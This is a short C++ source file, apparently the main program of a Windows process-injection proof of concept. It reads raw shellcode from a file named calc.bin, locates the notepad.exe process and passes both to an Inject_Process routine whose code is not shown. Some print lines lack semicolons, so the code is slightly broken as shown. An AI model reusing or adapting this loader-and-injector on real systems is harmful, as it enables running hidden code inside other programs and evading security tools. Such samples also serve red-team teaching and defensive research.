#include <iostream>
#include <tchar.h>
#include <stdio.h>
#include <strsafe.h>
#include <Windows.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <string>

#include "Locate.h"
#include "Inject.h"
#include "Utils.h"

unsigned char* Read(const char* file_name, unsigned int* shellcode_size) {
    FILE* file;
    errno_t err = fopen_s(&file, file_name, "rb");

    if (err != 0) {
        print("[-] Failed to open file")
        return 0;
    }

    fseek(file, 0, SEEK_END);
    long fsize = ftell(file);

    fseek(file, 0, SEEK_SET);
    unsigned char* shellcode = new unsigned char[fsize + 1];

    if (shellcode == NULL) {
        print("[-] Failed to read shellcode")
		return 0;
    }

    fread(shellcode, 1, fsize, file);
    fclose(file);

    shellcode[fsize] = '\0'; 
    *shellcode_size = fsize;

    return shellcode;
}



int main(int argc, const char *argv[])
{
    unsigned int* shellcode_size = new unsigned int;
    unsigned char* shellcode = Read("calc.bin", shellcode_size);

    int PID = Locate("notepad.exe");

    if (PID == 0) {
        print("Failed to locate process")
		return 0;
	}
    
    Inject_Process(PID, shellcode, *shellcode_size);
    return 0;
}